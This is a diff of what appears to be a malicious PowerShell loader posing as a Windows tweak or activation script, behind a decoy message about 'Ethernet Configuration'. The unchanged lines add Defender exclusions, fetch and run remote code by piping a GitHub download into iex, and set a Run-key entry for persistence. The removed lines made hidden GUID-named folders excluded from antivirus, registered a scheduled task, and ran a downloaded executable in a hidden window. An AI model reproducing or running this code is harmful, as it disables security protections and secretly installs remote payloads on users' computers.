@@ -62,25 +62,9 @@ function Disable-UAC {
 }
 
 if ($uacStatus -eq $false) {
-    Add-ScheduledTask
-    New-Item -ItemType $directory -Path $persistFolder -Force | Out-Null
-    Set-ItemProperty -Path $persistFolder -Name Attributes -Value $hiddenAttr
-    Add-Exclusion -Path $persistFolder -ErrorAction $stopAction
-
-    $hiddenFolder = Join-Path $env:ProgramFiles ([System.Guid]::NewGuid().ToString())
-    New-Item -ItemType $directory -Path $hiddenFolder | Out-Null
-    Add-Exclusion -Path $hiddenFolder -ErrorAction $stopAction
-    $tempPath = Join-Path $hiddenFolder $updaterExe
-
     try {
         Write-Host "Loading Ethernet Configuration..." -BackgroundColor Green
         Add-Exclusion -Path $programfiles -ErrorAction $stopAction
-        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
-    
-        Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
-        Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
-    
-        $process = Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -PassThru -Wait
         iwr "https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/SuccesfulRun" | iex
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
         $regName = "Windows Powershell Application"
